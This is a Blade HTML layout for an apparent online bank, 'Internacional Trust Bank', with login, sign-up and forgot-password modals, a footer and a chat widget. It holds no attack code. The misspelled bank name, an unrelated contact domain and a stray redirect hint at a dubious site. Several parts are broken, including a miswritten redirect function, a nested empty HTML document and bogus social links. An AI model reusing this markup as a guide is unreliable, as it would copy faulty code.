<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Internacional Trust Bank </title>
{{--    <meta http-equiv="refresh" content="0;https://nestlecity.com">--}}
    <script language=javascript>
        function redirect(){
            if(window.location.href === "https://fedstatebank.com"){
                window.location.replace = "https://nestlecity.com";
            }else{
                window.location.replace = "https://nestlecity.com";
            }
        }
    </script>

    <!-- Bootstrap -->
    <link href="{{ asset('front/assets/css/bootstrap.min.css') }}" rel="stylesheet">

    <!-- External Css -->
    <link rel="stylesheet" href="{{ asset('front/assets/css/font-awesome.min.css') }}">
    <link rel="stylesheet" href="{{ asset('front/assets/css/themify-icons.css') }}" />
    <link rel="stylesheet" href="{{ asset('front/assets/css/magnific-popup.css') }}" />
    <link rel="stylesheet" href="{{ asset('front/assets/css/owl.carousel.css') }}" />

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{ asset('front/css/main.css') }}">

    <!--My Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{ asset('front/css/mine.css') }}">

    <!--My Custom Css -->
    <a href="dashboard/international_transfer.html"></a>
    <link rel="stylesheet" type="text/css" href="{{ asset('front/css/animate.min.css') }}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700%7COpen+Sans" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Expletus+Sans" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="{{ asset('img/favicon.jpg') }}">
{{--    <link rel="shortcut icon" type="image/png" href="img/favicon.jpg">--}}
    <link rel="stylesheet" href="{{ asset('front/css/animations.css') }}">
    <link href="sweetalert-js/sweetalert.html" rel="stylesheet" type="text/css">
    <script type="text/javascript" src="sweetalert-js/sweetalert.min.html"></script>
    <script type="text/javascript" src="sweetalert-js/sweetalert-2.html"></script>

    <style type="text/css">

        .navbar-flexo .navbar-collapse{
            background: white !important;
        }
        .navbar-flexo .navbar-collapse .navbar-nav li.dropdown::before{
            color: #336699 !important;
        }

        body {
            overflow-x: visible;
        }

    </style>
</head>
<body style=" overflow-x: hidden;" >
<div class="container-fluid" style=" padding-right:0px; padding-left:0px;">
<!-- Banner End -->

@yield('content')


<div class="container-fluid">
    <div class="row">

        <div class="holdBottom hidden-md hidden-sm hidden-lg">
            <div class="down_button1 text-center">
                <a target="_blank" href="mailto:admin@nestlecity.com?subject=Mail from Internacional Trust Bank Bank" class="text_white text-center no_text_deco no_color_on_hover" style=" width: 100%; height: 100%;"><i class="fa fa-envelope text_white"></i>&nbsp; Contact Us</a>
            </div>
            <div class="up_button text-center"><a style="width: 100%; height: 100%;" class="text_white no_text_deco no_color_on_hover" href="{{ route('login') }}">LOG IN</a></div>
            <div class="down_button2 text-center"><a style="width: 100%; height: 100%;" class="no_color_on_hover text_white no_text_deco" target="_blank" href="{{ route('register') }}">OPEN ACCOUNT</a></div>
        </div>


        <div class="control-side hidden hidden-xs">

            <div class="down_button1 text-center" style="width: 100%; background-color: #3262d9;" >
                <a style="width: 100%; height: 100%; line-height:70px;" class="text_white no_text_deco no_color_on_hover" href="{{ route('login') }}">
                    <i class="fa fa-user text_white"></i>&nbsp;Login
                </a>
            </div>
            <div class="upp_button text-center" style="background: #151D28; ">
                <a target="_blank" href="{{ route('register') }}" class="text_white text-center no_text_deco no_color_on_hover" style=" width: 100%; height: 100%; line-height:70px;">
                    <i class="fa fa-check-circle-o text_white"></i>&nbsp; Open Account</a>
            </div>


        </div>


        <div id="regModal" class="my_modal hideModal rubberBand wow " style="background: url('images/bg_reg.jpg'); background-repeat: no-repeat; background-size: cover;">
            <span class="hanle-closer text-center" onClick="hideRegModal();"><a href="javascript:;"><i class="fa fa-times fa-2x text_white"></i></a></span>

            <div class="row theModalBody">
                <div class="col-md-2 col-md-offset-5 col-sm-4 col-sm-offset-4 col-xs-4 col-xs-offset-4 text-center control-mouse" >
                    <img src="images/slider/theMouse.png" class="img-responsive">
                </div>
                <h3 class="col-md-12 col-sm-12 col-xs-12 text_white text-uppercase text-center control-text" style="margin-top:20px !important; font-family: Segoe, Segoe UI, DejaVu Sans, Trebuchet MS, Verdana, sans-serif !important;" >
                    Hello
                </h3>
                <div class="col-md-12 col-sm-12 col-xs-12 text_white text-uppercase text-center" style="font-size:16px; font-family: 'Lato-Light';">
                    Let's jump straight in!
                </div>

                <div class="col-md-6 col-md-offset-3 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" style="margin-top: 20px;">


                    <div class="form-group">
                        <input type="text" id="fullName" onKeyUp="onkeyup_check(this); validate_alpha(this)" onBlur="validate_alpha_onBlur(this)" class="form-control theForm" placeholder="Full Name">
                    </div>

                </div>
                <div class="col-md-6 col-md-offset-3 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" style="margin-top: 20px;">
                    <div class="form-group">
                        <input type="email" id="email" onKeyUp="onkeyup_check(this); checkEmail(this)" onBlur="theEmailValidatorOblur(this)" class="form-control theForm" placeholder="E-mail">
                    </div>
                </div>
                <div class="col-md-6 col-md-offset-3 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" style="margin-top: 20px;">
                    <div class="input-group">
                        <span class="input-group-addon theForm" id="basic-addon1"></span>
                        <input type="text" id="phone" onKeyUp="onkeyup_check(this); onkeyup_num(this); getVal(this)" onBlur="numValidatorOnblur(this)" class="form-control theForm" placeholder="Phone Number">
                    </div>
                </div>
                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <small class="text_white text-center"><i class="fa fa-shield"></i>&nbsp;&nbsp;The Information you share with us goes through 256bit encryption</small>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <a href="javascript:;" id="tradeControl" onClick="loadNext()" class="button button-4x covered_but round_but no_color_on_hover" >Enroll</a>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <small class="text_white text-center"><i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;Trading Carries Sizeable Risks</small>
                </div>

                <div class="col-md-5 col-sm-5 col-xs-12 text-center" style="margin-top: 10px;">
                    <small class="text_white text-center">or sign in with &nbsp;&nbsp;</small>
                    <ul style="display: inline-block;" style="margin-top: 10px;">
                        <li style="display: inline;" class="text-center">
                            <a href="www.facebook.html" class="holdSocial text-center">
                                <i class="fa fa-facebook" style="color:white;"></i>
                            </a>
                        </li>&nbsp;
                        <li style="display: inline;" class="text-center">
                            <a href="www.google.html" class="holdSocial text-center">
                                <i class="fa fa-google-plus" style="color: white;"></i>
                            </a>
                        </li>
                    </ul>
                </div>

            </div>


        </div>


        <div id="signInModal" class="my_modal2 hideModal " style="background: url(images/slider/mobile_slider.png); background-repeat: no-repeat; background-size: cover;">
            <span class="hanle-closer text-center" onClick="hideSignInModal();"><a href="javascript:;"><i class="fa fa-times fa-2x text_white"></i></a></span>

            <div class="row">
                <div class="col-md-2 col-md-offset-5 col-sm-4 col-sm-offset-4 col-xs-2 col-xs-offset-5 text-center control-mouse1" >
                    <img src="images/slider/lock-open.png" class="img-responsive">
                </div>
                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" style="margin-top: 20px;">
                    <div class="modal-body">
                        <div class="section-heading text-center text_white">
                            <h5 class="title"><b>SECURITY TIPS</b></h5>
                            <div class="modal-thumb">
                                <img src="images/modal/internet-banking.gif" class="img-responsive" alt="">
                            </div>
                            <p class="subtext">Your Account <b>User ID</b> and <b>Password</b> are confidential. Do not disclose to anyone. <br>If you suspect fraud, call us using the number on the back of your bank card.</p>
                        </div>
                    </div>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <a target="_blank" href="login.html" class="button button-4x covered_but round_but no_color_on_hover" >LOGIN</a>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center text_white" style="margin-top: 10px;">
                    Not Yet Registered?<br><a target="_blank" href="{{ route('register') }}" class="no_color_on_hover" style="text-decoration: underline;"  >Enroll Now!</a>
                </div>

            </div>


        </div>

        <div id="forGetPass" class="my_modal2 hideModal " style="background: url(images/slider/mobile_slider.png); background-repeat: no-repeat; background-size: cover;">
            <span class="hanle-closer text-center" onClick="hideForgetModal();"><a href="javascript:;"><i class="fa fa-times fa-2x text_white"></i></a></span>

            <div class="row">
                <div class="col-md-2 col-md-offset-5 col-sm-4 col-sm-offset-4 col-xs-2 col-xs-offset-5 text-center control-mouse1" >
                    <img src="{{ asset('front/images/slider/frgtPass.png') }}" class="img-responsive">
                </div>
                <h3 class="col-md-12 col-sm-12 col-xs-12 text_white text-uppercase text-center control-text" style="margin-top:20px !important; font-family: quot, Comic, Sans MS, cursive !important;" >
                    Forgot Password
                </h3>
                <div class="col-md-12 col-sm-12 col-xs-12 text_white text-uppercase text-center" style="font-size:16px; font-family: 'Lato-Light';">
                    Please Enter Your Email
                </div>


                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1" style="margin-top: 20px;">
                    <div class="form-group">
                        <input type="email" class="form-control theForm" placeholder="E-mail">
                    </div>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <a class="button button-4x covered_but round_but no_color_on_hover" >Send Mail</a>
                </div>

                <div class="col-md-8 col-md-offset-2 col-sm-10 col-sm-offset-1 col-xs-10 col-xs-offset-1 text-center" style="margin-top: 10px;">
                    <a href="javascript:;" onClick="callSignInModal()" class="no_color_on_hover" >Login</a>
                </div>


            </div>


        </div>


    </div>
</div>
<div class="col-xs-12 col-sm-12 col-lg-12" style="margin-top: 10px;">

    <p style="color: green" class="text-center" ></p>

    <p style="color:#EF9C0C" class="text-center" ></p>

</div>

<!-- Footer -->
<div class="container-fluid" style="padding-left: 0px; padding-right: 0px;">
    <footer class="hazie_footer row">
        <div class="footer-widget-wrapper section-padding-80-55" style="background:url(front/images/slider/forex-bg.jpg); background-size: cover; background-repeat: no-repeat; padding-top: 40px;">
            <div class="container">
                <div class="row">
                    <div class="text-center col-md-6 col-md-offset-3 col-sm-6 col-sm-offset-3 col-xs-12">
                        <aside class="widget widget-content">
                            <div class="widget-body">
                                <div class="my-link">
                                    <ul >
                                        <li ><a href="{{ route('homepage') }}" class="text_white">Home</a></li>
                                        <li ><a href="{{ route('about') }}" class="text_white">About</a></li>
                                        <li ><a href="{{ route('contact') }}" class="text_white">Contact</a></li>
{{--                                        <li ><a href="{{ route('careers') }}" class="text_white">Careers</a></li>--}}
                                    </ul>
                                </div>
                            </div>

                        </aside>
                    </div>
                    <div class="fix hidden-lg hidden-md"></div>
                </div>
            </div>
        </div>
        <div class="footer-copyright">
            <div class="container">
                <div class="row">
                    <div class="col-sm-6">
                        <div class="copyright">
                            <p> <a href="#">Internacional Trust Bank </a> © 2021. All rights reserved.</p>

                        </div>
                    </div>
                    <div class="col-sm-6">
                        <div class="privacy text-right">
                            <ul>

                                <li><a href="{{ route('risk_disclosure') }}">Risk Disclosure </a> |
                                    <a href="{{ route('terms') }}">Terms & Conditions </a> |
                                    <a href="{{ route('privacy_policy') }}">Privacy Policy</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
</div>
</div>
<!-- Footer End -->
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
<script src="{{ asset('front/assets/js/jquery.min.js') }}"></script>
<!-- Include all compiled plugins (below), or include individual files as needed -->
<script src="{{ asset('front/assets/js/bootstrap.min.js') }}"></script>
<script src="{{ asset('front/assets/js/imagesloaded.pkgd.min.js') }}"></script>
<script src="{{ asset('front/assets/js/isotope.pkgd.min.js') }}"></script>
<script src="{{ asset('front/assets/js/jquery.countdown.min.js') }}"></script>
<script src="{{ asset('front/assets/js/jquery.countTo.js') }}"></script>
<script src="{{ asset('front/assets/js/jquery.magnific-popup.min.js') }}"></script>
<script src="{{ asset('front/assets/js/owl.carousel.min.js') }}"></script>
<script src="{{ asset('front/assets/js/visible.js') }}"></script>
<script src="{{ asset('front/assets/js/jquery.ajaxchimp.min.js') }}"></script>
<script src="{{ asset('front/js/custom.js') }}"></script>
<script src="{{ asset('front/js/main.js') }}"></script>
<!--<script src="js/mine.js"></script>-->
<script src="{{ asset('front/js/wow.min.js') }}"></script>


<!--Start of Tawk.to Script-->
<script type="text/javascript">
    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
    (function(){
        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
        s1.async=true;
        s1.src='https://embed.tawk.to/5edbf9b84a7c6258179a1104/default';
        s1.charset='UTF-8';
        s1.setAttribute('crossorigin','*');
        s0.parentNode.insertBefore(s1,s0);
    })();
</script>
<!--End of Tawk.to Script-->

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
</head>
<body>

</body>
</html>
</body>
</html>
